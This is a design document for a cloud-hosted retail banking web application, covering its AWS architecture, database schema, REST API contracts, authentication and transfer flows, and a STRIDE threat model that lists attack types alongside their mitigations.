# Design Document — SecureBank

## Overview

SecureBank is a three-tier retail banking web application deployed on AWS ECS. The system
exposes a React SPA (served via NGINX on ECS Fargate) as the presentation layer, a
Node.js/Express REST API as the business logic layer, and a PostgreSQL database on Amazon RDS
as the data layer. All tiers live inside a single VPC with public and private subnets. An
Application Load Balancer (ALB) with AWS WAF sits at the public boundary and terminates TLS
before forwarding traffic to the private application tier.

The design prioritises security at every layer — JWT-based authentication with MFA,
AES-256-GCM encryption for PII fields, RBAC middleware, parameterised queries, Helmet.js
security headers, and AWS Secrets Manager for credential management — while also providing
the operational visibility needed for a production banking system (structured JSON logs,
CloudWatch metrics, SNS alerting, CloudTrail audit trail).

---

## Architecture

### System Architecture Diagram

```
Internet
    │
    ▼
┌─────────────────────────────────────────────────────────────────┐
│  AWS WAF (Managed Rules: SQLi, XSS)                             │
└───────────────────────────┬─────────────────────────────────────┘
                            │
┌───────────────────────────▼─────────────────────────────────────┐
│                     PUBLIC SUBNET (us-east-1a/1b)               │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │   Application Load Balancer (HTTPS :443, HTTP→HTTPS :80)  │  │
│  │   ACM Certificate  |  TLS 1.2+ minimum                    │  │
│  └───────────┬────────────────────────┬───────────────────────┘  │
└──────────────│────────────────────────│─────────────────────────┘
               │ Target Group /static   │ Target Group /api
┌──────────────▼────────────────────────▼─────────────────────────┐
│                    PRIVATE SUBNET (us-east-1a/1b)               │
│                                                                  │
│  ┌─────────────────────┐    ┌─────────────────────────────────┐ │
│  │  ECS Fargate Task   │    │  ECS Fargate Task               │ │
│  │  NGINX + React SPA  │    │  Node.js/Express API            │ │
│  │  (Port 80)          │    │  (Port 3000)                    │ │
│  │  SG: sg-frontend    │    │  SG: sg-api                     │ │
│  └─────────────────────┘    └────────────────┬────────────────┘ │
│                                              │                   │
└──────────────────────────────────────────────│──────────────────┘
                                               │
┌──────────────────────────────────────────────▼──────────────────┐
│                ISOLATED DB SUBNET (us-east-1a/1b)               │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Amazon RDS PostgreSQL (Multi-AZ)                        │    │
│  │  SG: sg-rds  (inbound 5432 from sg-api only)            │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘

Supporting Services (outside VPC data path):
  AWS Secrets Manager ←──── ECS Task IAM Role
  AWS SNS             ←──── Auth_Service (OTP delivery)
  Amazon ECR          ←──── CodeBuild / ECS pull
  CloudWatch Logs     ←──── awslogs driver (ECS tasks)
  CloudTrail          ──→   S3 (encrypted audit bucket)
  CodePipeline / CodeBuild ─── GitHub → build → ECR → ECS
```

### VPC Topology

| Subnet type     | CIDR example     | Resources                              |
|-----------------|------------------|----------------------------------------|
| Public          | 10.0.0.0/24 (1a) | ALB                                    |
| Public          | 10.0.1.0/24 (1b) | ALB (multi-AZ)                         |
| Private App     | 10.0.2.0/24 (1a) | ECS Fargate (frontend, API)            |
| Private App     | 10.0.3.0/24 (1b) | ECS Fargate (frontend, API)            |
| Isolated DB     | 10.0.4.0/24 (1a) | RDS PostgreSQL primary                 |
| Isolated DB     | 10.0.5.0/24 (1b) | RDS PostgreSQL standby (Multi-AZ)      |

NAT Gateways in each public subnet provide outbound internet access for ECS tasks (ECR pull,
Secrets Manager, SNS). No inbound rules from the internet reach ECS tasks or RDS directly.

---

## Components and Interfaces

### Component Responsibilities

| Component           | Technology          | Responsibility                                                       |
|---------------------|---------------------|----------------------------------------------------------------------|
| React SPA           | React 18 + TypeScript, NGINX | UI rendering, JWT storage (memory), API calls via Axios    |
| API Gateway Layer   | Express middleware  | JWT validation, RBAC, rate limiting, input validation, Helmet.js     |
| Auth_Service        | Node.js module     | Password verification, OTP generation/delivery, JWT/Refresh issuance |
| Account_Service     | Node.js module     | Balance retrieval, mini-statement, account masking                   |
| Transfer_Service    | Node.js module     | Own-account transfers, beneficiary CRUD, idempotency                 |
| Transaction_Service | Node.js module     | Paginated history, filtering, CSV export, running balance            |
| Loan_Service        | Node.js module     | EMI calculation, eligibility decision, application persistence       |
| PostgreSQL (RDS)    | PostgreSQL 15      | All persistent data storage                                          |
| Redis (ElastiCache) | Redis 7            | Token revocation list, OTP store, rate-limit counters, session store |

### Inter-Service Communication

All inter-component communication is in-process within the Node.js API container. There are no
separate microservice network calls between services. The single ECS API task runs the Express
app with all service modules loaded. External calls from the API are:

- **RDS** — parameterised SQL over pg driver (TCP 5432, private subnet)
- **Redis** — ioredis client (TCP 6379, private subnet ElastiCache)
- **AWS Secrets Manager** — AWS SDK v3 (HTTPS, VPC endpoint or NAT)
- **AWS SNS** — AWS SDK v3 (HTTPS, for OTP delivery)

### API Gateway Middleware Chain

```
Request
  │
  ├─ Helmet.js (security headers)
  ├─ express-rate-limit (100 req/min per IP on /auth/*)
  ├─ JSON schema validation (ajv)
  ├─ Input sanitisation (DOMPurify equivalent / custom strip)
  ├─ JWT verification (jsonwebtoken, RS256)
  ├─ RBAC role check (custom middleware)
  │
  └─ Route handler (Auth | Account | Transfer | Transaction | Loan)
```

---

## Data Models

### Database Schema / ERD

```sql
-- ───────────────────────────────────────────────
-- USERS (authentication + identity)
-- ───────────────────────────────────────────────
CREATE TABLE users (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  username         VARCHAR(100) UNIQUE NOT NULL,
  email            VARCHAR(255) UNIQUE NOT NULL,
  phone            VARCHAR(20)  NOT NULL,
  password_hash    VARCHAR(255) NOT NULL,          -- bcrypt, cost ≥ 12
  role             VARCHAR(20)  NOT NULL            -- CUSTOMER | BRANCH_MANAGER | ADMIN
                   CHECK (role IN ('CUSTOMER','BRANCH_MANAGER','ADMIN')),
  pan_encrypted    BYTEA,                           -- AES-256-GCM ciphertext
  aadhaar_encrypted BYTEA,                          -- AES-256-GCM ciphertext
  failed_attempts  SMALLINT     NOT NULL DEFAULT 0,
  is_locked        BOOLEAN      NOT NULL DEFAULT FALSE,
  locked_reason    VARCHAR(255),
  otp_channel      VARCHAR(10)  NOT NULL DEFAULT 'EMAIL'
                   CHECK (otp_channel IN ('EMAIL','SMS')),
  created_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  updated_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);

-- ───────────────────────────────────────────────
-- ACCOUNTS
-- ───────────────────────────────────────────────
CREATE TABLE accounts (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id          UUID         NOT NULL REFERENCES users(id),
  account_number   VARCHAR(20)  UNIQUE NOT NULL,
  account_type     VARCHAR(10)  NOT NULL
                   CHECK (account_type IN ('SAVINGS','CURRENT','FD')),
  available_balance NUMERIC(18,2) NOT NULL DEFAULT 0.00,
  currency         CHAR(3)      NOT NULL DEFAULT 'INR',
  is_active        BOOLEAN      NOT NULL DEFAULT TRUE,
  created_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  updated_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_accounts_user_id ON accounts(user_id);

-- ───────────────────────────────────────────────
-- TRANSACTIONS / LEDGER ENTRIES
-- ───────────────────────────────────────────────
CREATE TABLE transactions (
  id               BIGSERIAL    PRIMARY KEY,        -- monotonic sequence for audit
  transfer_ref_id  UUID         NOT NULL,           -- links debit+credit pair
  account_id       UUID         NOT NULL REFERENCES accounts(id),
  entry_type       VARCHAR(6)   NOT NULL CHECK (entry_type IN ('DEBIT','CREDIT')),
  amount           NUMERIC(18,2) NOT NULL CHECK (amount > 0),
  currency         CHAR(3)      NOT NULL DEFAULT 'INR',
  running_balance  NUMERIC(18,2) NOT NULL,
  transfer_mode    VARCHAR(5)   NOT NULL CHECK (transfer_mode IN ('NEFT','IMPS','INTERNAL')),
  narration        VARCHAR(500),
  transaction_date TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  created_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_txn_account_date ON transactions(account_id, transaction_date DESC);
CREATE INDEX idx_txn_transfer_ref ON transactions(transfer_ref_id);

-- ───────────────────────────────────────────────
-- TRANSFER RECORDS (double-entry header)
-- ───────────────────────────────────────────────
CREATE TABLE transfers (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(), -- transfer_ref_id
  customer_id      UUID         NOT NULL REFERENCES users(id),
  source_account_id UUID        NOT NULL REFERENCES accounts(id),
  dest_account_id  UUID         NOT NULL REFERENCES accounts(id),
  amount           NUMERIC(18,2) NOT NULL CHECK (amount > 0),
  currency         CHAR(3)      NOT NULL DEFAULT 'INR',
  transfer_mode    VARCHAR(5)   NOT NULL CHECK (transfer_mode IN ('NEFT','IMPS')),
  idempotency_key  UUID         UNIQUE NOT NULL,
  status           VARCHAR(15)  NOT NULL DEFAULT 'COMPLETED'
                   CHECK (status IN ('COMPLETED','FAILED','PENDING')),
  created_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_transfers_idempotency ON transfers(idempotency_key);
CREATE INDEX idx_transfers_customer    ON transfers(customer_id);

-- ───────────────────────────────────────────────
-- BENEFICIARIES
-- ───────────────────────────────────────────────
CREATE TABLE beneficiaries (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  owner_user_id    UUID         NOT NULL REFERENCES users(id),
  account_number   VARCHAR(20)  NOT NULL,
  ifsc_code        VARCHAR(15)  NOT NULL,
  name             VARCHAR(255) NOT NULL,
  bank_name        VARCHAR(255),
  status           VARCHAR(10)  NOT NULL DEFAULT 'PENDING'
                   CHECK (status IN ('PENDING','VERIFIED','DELETED')),
  verified_by      UUID         REFERENCES users(id),
  verified_at      TIMESTAMPTZ,
  daily_limit      NUMERIC(18,2) NOT NULL DEFAULT 10000.00,
  deleted_at       TIMESTAMPTZ,
  created_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  updated_at       TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_bene_owner ON beneficiaries(owner_user_id);

-- ───────────────────────────────────────────────
-- LOAN_APPLICATIONS
-- ───────────────────────────────────────────────
CREATE TABLE loan_applications (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  customer_id      UUID         NOT NULL REFERENCES users(id),
  gross_monthly_income  NUMERIC(18,2) NOT NULL CHECK (gross_monthly_income > 0),
  existing_emi          NUMERIC(18,2) NOT NULL CHECK (existing_emi >= 0),
  loan_amount           NUMERIC(18,2) NOT NULL CHECK (loan_amount > 0),
  tenure_months         SMALLINT      NOT NULL CHECK (tenure_months > 0),
  annual_interest_rate  NUMERIC(6,4)  NOT NULL,
  calculated_emi        NUMERIC(18,2),
  total_payable         NUMERIC(18,2),
  effective_rate        NUMERIC(6,4),
  decision             VARCHAR(10)  NOT NULL
                       CHECK (decision IN ('APPROVED','REJECTED','PENDING')),
  rejection_reason     VARCHAR(100),
  submitted_at         TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  updated_at           TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_loan_customer ON loan_applications(customer_id);
CREATE INDEX idx_loan_decision  ON loan_applications(decision);

-- ───────────────────────────────────────────────
-- SESSIONS / REFRESH_TOKENS
-- ───────────────────────────────────────────────
CREATE TABLE refresh_tokens (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id          UUID         NOT NULL REFERENCES users(id),
  token_hash       VARCHAR(255) UNIQUE NOT NULL, -- SHA-256 of token value
  issued_at        TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  expires_at       TIMESTAMPTZ  NOT NULL,
  revoked_at       TIMESTAMPTZ,
  replaced_by      UUID         REFERENCES refresh_tokens(id),
  user_agent       VARCHAR(500),
  ip_address       INET
);
CREATE INDEX idx_rt_user_id    ON refresh_tokens(user_id);
CREATE INDEX idx_rt_token_hash ON refresh_tokens(token_hash);

-- ───────────────────────────────────────────────
-- OTP_CHALLENGES
-- ───────────────────────────────────────────────
CREATE TABLE otp_challenges (
  id               UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id          UUID         NOT NULL REFERENCES users(id),
  otp_hash         VARCHAR(255) NOT NULL,  -- bcrypt of 6-digit OTP
  channel          VARCHAR(5)   NOT NULL CHECK (channel IN ('EMAIL','SMS')),
  issued_at        TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  expires_at       TIMESTAMPTZ  NOT NULL, -- issued_at + 5 min
  used_at          TIMESTAMPTZ,
  is_used          BOOLEAN      NOT NULL DEFAULT FALSE
);
CREATE INDEX idx_otp_user_id ON otp_challenges(user_id);
```

### ERD (Textual)

```
users ─────┬──< accounts ──< transactions
           │
           ├──< refresh_tokens
           │
           ├──< otp_challenges
           │
           ├──< transfers (as customer_id)
           │         │
           │         └── references accounts (source + dest)
           │
           ├──< beneficiaries (as owner_user_id)
           │         └── verified_by ──> users
           │
           └──< loan_applications
```

---

## API Contracts (OpenAPI 3.0)

```yaml
openapi: "3.0.3"
info:
  title: SecureBank API
  version: "1.0.0"
  description: REST API for the SecureBank three-tier banking application

servers:
  - url: https://api.securebank.example.com/v1

components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
  schemas:
    Error:
      type: object
      properties:
        code:    { type: string }
        message: { type: string }
        details: { type: array, items: { type: string } }
    LoginRequest:
      type: object
      required: [username, password]
      properties:
        username: { type: string }
        password: { type: string, format: password }
    LoginResponse:
      type: object
      properties:
        mfa_challenge_id: { type: string, format: uuid }
        otp_channel:      { type: string, enum: [EMAIL, SMS] }
    MfaRequest:
      type: object
      required: [mfa_challenge_id, otp]
      properties:
        mfa_challenge_id: { type: string, format: uuid }
        otp:              { type: string, pattern: "^[0-9]{6}$" }
    TokenResponse:
      type: object
      properties:
        access_token:  { type: string }
        refresh_token: { type: string }
        expires_in:    { type: integer, description: "seconds (900)" }
    RefreshRequest:
      type: object
      required: [refresh_token]
      properties:
        refresh_token: { type: string }
    AccountSummary:
      type: object
      properties:
        account_id:       { type: string, format: uuid }
        account_type:     { type: string, enum: [SAVINGS, CURRENT, FD] }
        masked_number:    { type: string, example: "****1234" }
        available_balance:{ type: number }
        currency:         { type: string, example: "INR" }
    Transaction:
      type: object
      properties:
        id:               { type: integer }
        entry_type:       { type: string, enum: [DEBIT, CREDIT] }
        amount:           { type: number }
        running_balance:  { type: number }
        transfer_mode:    { type: string }
        narration:        { type: string }
        transaction_date: { type: string, format: date-time }
    PaginatedTransactions:
      type: object
      properties:
        data:        { type: array, items: { $ref: '#/components/schemas/Transaction' } }
        total:       { type: integer }
        page:        { type: integer }
        page_size:   { type: integer }
    TransferRequest:
      type: object
      required: [source_account_id, dest_account_id, amount, transfer_mode, idempotency_key]
      properties:
        source_account_id: { type: string, format: uuid }
        dest_account_id:   { type: string, format: uuid }
        amount:            { type: number, minimum: 0.01 }
        transfer_mode:     { type: string, enum: [NEFT, IMPS] }
        idempotency_key:   { type: string, format: uuid }
        narration:         { type: string, maxLength: 500 }
    TransferResponse:
      type: object
      properties:
        transfer_ref_id: { type: string, format: uuid }
        status:          { type: string, enum: [COMPLETED, FAILED, PENDING] }
        created_at:      { type: string, format: date-time }
    Beneficiary:
      type: object
      properties:
        id:             { type: string, format: uuid }
        account_number: { type: string }
        ifsc_code:      { type: string }
        name:           { type: string }
        bank_name:      { type: string }
        status:         { type: string, enum: [PENDING, VERIFIED, DELETED] }
        daily_limit:    { type: number }
    LoanEligibilityRequest:
      type: object
      required: [gross_monthly_income, existing_emi, loan_amount, tenure_months, annual_interest_rate]
      properties:
        gross_monthly_income:  { type: number, exclusiveMinimum: 0 }
        existing_emi:          { type: number, minimum: 0 }
        loan_amount:           { type: number, exclusiveMinimum: 0 }
        tenure_months:         { type: integer, exclusiveMinimum: 0 }
        annual_interest_rate:  { type: number, exclusiveMinimum: 0 }
    LoanEligibilityResponse:
      type: object
      properties:
        application_id:    { type: string, format: uuid }
        decision:          { type: string, enum: [APPROVED, REJECTED, PENDING] }
        rejection_reason:  { type: string }
        calculated_emi:    { type: number }
        total_payable:     { type: number }
        effective_rate:    { type: number }
    LoanApplication:
      type: object
      properties:
        id:           { type: string, format: uuid }
        customer_id:  { type: string, format: uuid }
        decision:     { type: string, enum: [APPROVED, REJECTED, PENDING] }
        loan_amount:  { type: number }
        submitted_at: { type: string, format: date-time }
```

paths:
  # ── AUTH ──────────────────────────────────────
  /auth/login:
    post:
      summary: Step 1 — Password verification
      tags: [Auth]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/LoginRequest' }
      responses:
        "200":
          description: Password accepted; OTP sent to registered channel
          content:
            application/json:
              schema: { $ref: '#/components/schemas/LoginResponse' }
        "401": { description: Invalid credentials }
        "423": { description: Account locked }
        "429": { description: Rate limit exceeded }

  /auth/mfa:
    post:
      summary: Step 2 — OTP verification; returns tokens
      tags: [Auth]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/MfaRequest' }
      responses:
        "200":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/TokenResponse' }
        "401": { description: Invalid or expired OTP }

  /auth/logout:
    post:
      summary: Revoke active JWT and Refresh_Token
      tags: [Auth]
      security: [{ BearerAuth: [] }]
      responses:
        "200": { description: Tokens revoked }
        "401": { description: Not authenticated }

  /auth/refresh:
    post:
      summary: Rotate Refresh_Token; issue new JWT
      tags: [Auth]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/RefreshRequest' }
      responses:
        "200":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/TokenResponse' }
        "401": { description: Token expired or revoked }

  # ── ACCOUNTS ──────────────────────────────────
  /accounts:
    get:
      summary: Account summary (all accounts for caller)
      tags: [Accounts]
      security: [{ BearerAuth: [] }]
      responses:
        "200":
          content:
            application/json:
              schema:
                type: array
                items: { $ref: '#/components/schemas/AccountSummary' }
        "401": { description: Unauthenticated }
        "403": { description: Forbidden }
        "503": { description: DB unavailable }

  /accounts/{accountId}/mini-statement:
    get:
      summary: Last 10 transactions for an account
      tags: [Accounts]
      security: [{ BearerAuth: [] }]
      parameters:
        - name: accountId
          in: path
          required: true
          schema: { type: string, format: uuid }
      responses:
        "200":
          content:
            application/json:
              schema:
                type: array
                items: { $ref: '#/components/schemas/Transaction' }
        "403": { description: Account not owned by caller }
        "503": { description: DB unavailable }

  # ── TRANSACTIONS ──────────────────────────────
  /accounts/{accountId}/transactions:
    get:
      summary: Paginated transaction history with filters
      tags: [Transactions]
      security: [{ BearerAuth: [] }]
      parameters:
        - { name: accountId, in: path, required: true, schema: { type: string, format: uuid } }
        - { name: page, in: query, schema: { type: integer, default: 1 } }
        - { name: page_size, in: query, schema: { type: integer, enum: [10,25,50], default: 25 } }
        - { name: start_date, in: query, schema: { type: string, format: date } }
        - { name: end_date, in: query, schema: { type: string, format: date } }
        - { name: min_amount, in: query, schema: { type: number, minimum: 0 } }
        - { name: max_amount, in: query, schema: { type: number, minimum: 0 } }
        - { name: type, in: query, schema: { type: string, enum: [DEBIT, CREDIT] } }
      responses:
        "200":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/PaginatedTransactions' }
        "403": { description: Account not owned by caller }

  /accounts/{accountId}/transactions/export:
    get:
      summary: CSV statement download
      tags: [Transactions]
      security: [{ BearerAuth: [] }]
      parameters:
        - { name: accountId, in: path, required: true, schema: { type: string, format: uuid } }
        - { name: start_date, in: query, schema: { type: string, format: date } }
        - { name: end_date, in: query, schema: { type: string, format: date } }
      responses:
        "200":
          headers:
            Content-Disposition:
              schema: { type: string, example: 'attachment; filename="ACC1234_2024-01-01_2024-12-31.csv"' }
          content:
            text/csv:
              schema: { type: string }
        "403": { description: Forbidden }

  /transfers:
    post:
      summary: Initiate a fund transfer between own accounts
      tags: [Transfers]
      security: [{ BearerAuth: [] }]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/TransferRequest' }
      responses:
        "201":
          description: Transfer completed (or idempotent replay)
          content:
            application/json:
              schema: { $ref: '#/components/schemas/TransferResponse' }
        "400": { description: Invalid transfer mode or request body }
        "401": { description: Unauthenticated }
        "403": { description: Source or destination account not owned by caller }
        "422": { description: Insufficient funds or daily limit exceeded }
        "429": { description: Rate limit exceeded }
        "500": { description: Ledger integrity error or DB failure }

  /transfers/{transferId}:
    get:
      summary: Get status of a specific transfer
      tags: [Transfers]
      security: [{ BearerAuth: [] }]
      parameters:
        - name: transferId
          in: path
          required: true
          schema: { type: string, format: uuid }
      responses:
        "200":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/TransferResponse' }
        "403": { description: Transfer not owned by caller }
        "404": { description: Transfer not found }

  /beneficiaries:
    post:
      summary: Add a new beneficiary (starts in PENDING state)
      tags: [Beneficiaries]
      security: [{ BearerAuth: [] }]
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required: [account_number, ifsc_code, name]
              properties:
                account_number: { type: string, maxLength: 20 }
                ifsc_code:      { type: string, pattern: "^[A-Z]{4}0[A-Z0-9]{6}$" }
                name:           { type: string, maxLength: 255 }
                bank_name:      { type: string, maxLength: 255 }
      responses:
        "201":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/Beneficiary' }
        "400": { description: Validation error }
        "401": { description: Unauthenticated }
        "403": { description: Forbidden }
    get:
      summary: List all active beneficiaries for the authenticated customer
      tags: [Beneficiaries]
      security: [{ BearerAuth: [] }]
      parameters:
        - { name: status, in: query, schema: { type: string, enum: [PENDING, VERIFIED, DELETED] } }
      responses:
        "200":
          content:
            application/json:
              schema:
                type: array
                items: { $ref: '#/components/schemas/Beneficiary' }
        "401": { description: Unauthenticated }

  /beneficiaries/{id}:
    delete:
      summary: Soft-delete a beneficiary (sets status=DELETED, no grace period)
      tags: [Beneficiaries]
      security: [{ BearerAuth: [] }]
      parameters:
        - name: id
          in: path
          required: true
          schema: { type: string, format: uuid }
      responses:
        "200": { description: Beneficiary marked as deleted }
        "403": { description: Beneficiary not owned by caller }
        "404": { description: Beneficiary not found }

  /loans/eligibility:
    post:
      summary: Submit a loan eligibility check and persist the application
      tags: [Loans]
      security: [{ BearerAuth: [] }]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/LoanEligibilityRequest' }
      responses:
        "200":
          content:
            application/json:
              schema: { $ref: '#/components/schemas/LoanEligibilityResponse' }
        "400": { description: Invalid input (zero/negative values) }
        "401": { description: Unauthenticated }
        "500": { description: DB write failed; decision set to PENDING }

  /loans:
    get:
      summary: |
        CUSTOMER: list own loan applications.
        BRANCH_MANAGER / ADMIN: list all loan applications (paginated, 25/page).
      tags: [Loans]
      security: [{ BearerAuth: [] }]
      parameters:
        - { name: page, in: query, schema: { type: integer, default: 1 } }
        - { name: decision, in: query, schema: { type: string, enum: [APPROVED, REJECTED, PENDING] } }
      responses:
        "200":
          content:
            application/json:
              schema:
                type: object
                properties:
                  data:      { type: array, items: { $ref: '#/components/schemas/LoanApplication' } }
                  total:     { type: integer }
                  page:      { type: integer }
                  page_size: { type: integer, example: 25 }
        "401": { description: Unauthenticated }
        "403": { description: Forbidden }

  /health:
    get:
      summary: Health check — returns 200 if the API is reachable (no auth required)
      tags: [Health]
      security: []
      responses:
        "200":
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:  { type: string, example: "ok" }
                  version: { type: string, example: "1.0.0" }
                  db:      { type: string, enum: [ok, degraded, unreachable] }
```


---

## Data Flow Diagrams

### Authentication Flow (Login → OTP → JWT Issuance)

```
Client                  API Gateway             Auth_Service            SNS / Redis / DB
  │                         │                        │                        │
  │─── POST /auth/login ───►│                        │                        │
  │   {username, password}  │                        │                        │
  │                         │─── validate body ─────►│                        │
  │                         │                        │── lookup user ─────────►│ (DB: users)
  │                         │                        │◄── user record ─────────│
  │                         │                        │                        │
  │                         │                        │── bcrypt.compare() ─── (in-process)
  │                         │                        │                        │
  │                [valid password]                   │                        │
  │                         │                        │── increment           │
  │                         │                        │   failed_attempts=0   │
  │                         │                        │── generate 6-digit OTP│
  │                         │                        │── store otp_hash ──────►│ (DB: otp_challenges)
  │                         │                        │── publish OTP ─────────►│ (SNS: email/SMS)
  │                         │                        │                        │
  │◄── 200 {mfa_challenge_id, otp_channel} ──────────│                        │
  │                         │                        │                        │
  │─── POST /auth/mfa ─────►│                        │                        │
  │   {mfa_challenge_id,otp}│                        │                        │
  │                         │─── validate body ─────►│                        │
  │                         │                        │── lookup challenge ────►│ (DB: otp_challenges)
  │                         │                        │◄── challenge record ────│
  │                         │                        │                        │
  │                         │                        │── bcrypt.compare(otp)  │
  │                         │                        │── check expiry         │
  │                         │                        │                        │
  │                [valid OTP, not expired]           │                        │
  │                         │                        │── mark is_used=TRUE ───►│ (DB)
  │                         │                        │── sign JWT (RS256,15m) │
  │                         │                        │── create refresh_token │
  │                         │                        │── store token_hash ────►│ (DB: refresh_tokens)
  │                         │                        │── cache jti in Redis ──►│ (Redis revocation)
  │                         │                        │                        │
  │◄── 200 {access_token, refresh_token, expires_in=900} ────────────────────│
  │                         │                        │                        │
  │                [invalid password — up to 4 failures]                      │
  │                         │                        │── increment            │
  │                         │                        │   failed_attempts++ ───►│ (DB)
  │◄── 401 {generic error}  │                        │                        │
  │                         │                        │                        │
  │                [5th failure — account lockout]    │                        │
  │                         │                        │── set is_locked=TRUE ──►│ (DB)
  │◄── 423 {account_locked} │                        │                        │
```

### Fund Transfer Flow (Idempotency Check → Debit → Credit → Response)

```
Client               API Gateway            Transfer_Service                  DB (single txn)
  │                      │                        │                                │
  │─ POST /transfers ───►│                        │                                │
  │  {source, dest,      │                        │                                │
  │   amount, mode,      │                        │                                │
  │   idempotency_key}   │                        │                                │
  │                      │─ JWT verify ──────────►│                                │
  │                      │─ RBAC: CUSTOMER ───────►│                                │
  │                      │─ schema validate ──────►│                                │
  │                      │                        │                                │
  │                      │                        │─ SELECT FROM transfers ────────►│
  │                      │                        │  WHERE idempotency_key = K      │
  │                      │                        │◄─ result ──────────────────────│
  │                      │                        │                                │
  │             [key EXISTS — replay]             │                                │
  │                      │                        │── return cached response       │
  │◄─ 201 {original transfer_response} ──────────│                                │
  │                      │                        │                                │
  │             [key NOT EXISTS — new transfer]   │                                │
  │                      │                        │─ verify source account ────────►│
  │                      │                        │  belongs to customer            │
  │                      │                        │◄─ account record ──────────────│
  │                      │                        │                                │
  │                      │                        │─ check balance ≥ amount        │
  │                      │            [insufficient funds]                         │
  │◄─ 422 {insufficient_funds, available_balance}│                                │
  │                      │                        │                                │
  │                      │            [sufficient funds — BEGIN TRANSACTION]       │
  │                      │                        │─ UPDATE accounts ──────────────►│
  │                      │                        │  SET balance -= amount          │
  │                      │                        │  WHERE id = source_id           │
  │                      │                        │─ INSERT transactions ──────────►│
  │                      │                        │  (DEBIT, amount, running_bal)   │
  │                      │                        │─ UPDATE accounts ──────────────►│
  │                      │                        │  SET balance += amount          │
  │                      │                        │  WHERE id = dest_id             │
  │                      │                        │─ INSERT transactions ──────────►│
  │                      │                        │  (CREDIT, amount, running_bal)  │
  │                      │                        │─ INSERT transfers ─────────────►│
  │                      │                        │  (transfer_ref_id, idempotency) │
  │                      │                        │─ COMMIT ───────────────────────►│
  │                      │                        │◄─ success ─────────────────────│
  │                      │                        │                                │
  │◄─ 201 {transfer_ref_id, COMPLETED, created_at}│                               │
  │                      │                        │                                │
  │                      │            [DB error — ROLLBACK]                        │
  │                      │                        │◄─ error ───────────────────────│
  │◄─ 500 {ledger_integrity_error} ──────────────│                                │
```

---

## Security Threat Model (STRIDE)

| # | Category | Threat | Attack Vector | Mitigation | Residual Risk |
|---|----------|--------|---------------|------------|---------------|
| 1 | **Spoofing** | Attacker impersonates a legitimate customer by replaying a stolen JWT | Stolen bearer token from XSS or MitM | RS256 JWT signature verification; short 15-min expiry; token revocation list in Redis; HTTPS-only (TLS 1.2+); Secure/HttpOnly cookies if using cookie transport | Low — token window is 15 min; revocation closes it further |
| 2 | **Spoofing** | Attacker brute-forces OTP (10^6 space) | Repeated POST /auth/mfa calls | Rate limiting 100 req/min per IP; OTP expires in 5 min; bcrypt OTP hash comparison; account lockout after 5 failed password attempts | Low — rate limit + 5-min expiry makes exhaustion infeasible |
| 3 | **Tampering** | Attacker modifies JWT claims (e.g., elevates role from CUSTOMER to ADMIN) | Tampered Authorization header | RS256 asymmetric signing — private key in Secrets Manager, public key used for verification only; any tampering invalidates signature | Negligible — signature verification catches all tampering |
| 4 | **Tampering** | SQL injection to read/modify DB records | Crafted request body or query param | Parameterised queries (pg library); AJV schema validation rejects unexpected types; WAF managed SQLi rule group at ALB; Helmet.js CSP | Low — multiple independent layers |
| 5 | **Tampering** | XSS payload stored in narration or beneficiary name fields | POST body with `<script>` tags | Input sanitisation (strip HTML/JS event handlers) before persistence; Helmet.js CSP header prevents inline script execution; WAF XSS rules | Low — stored XSS mitigated by sanitisation + CSP |
| 6 | **Repudiation** | Customer denies initiating a transfer they authorised | Dispute claim | Every transfer persists customer_id, source, dest, amount, timestamp, idempotency_key; CloudTrail logs all AWS API calls; monotonically increasing ledger sequence; structured JSON audit logs with correlation IDs shipped to CloudWatch | Low — full audit trail with non-repudiation fields |
| 7 | **Repudiation** | Admin denies performing account unlock or beneficiary verification | Dispute claim | All privileged actions recorded in CloudTrail; structured logs include acting user's JWT sub claim and IP address | Low — CloudTrail provides tamper-evident evidence |
| 8 | **Information Disclosure** | DB breach exposes PAN and Aadhaar numbers | RDS snapshot exfiltration or SQL dump | AES-256-GCM encryption at application layer for PAN and Aadhaar; encryption key stored only in Secrets Manager, never in DB or source | Medium — if Secrets Manager key is also compromised, PII decryptable; mitigated by IAM access controls on Secrets Manager |
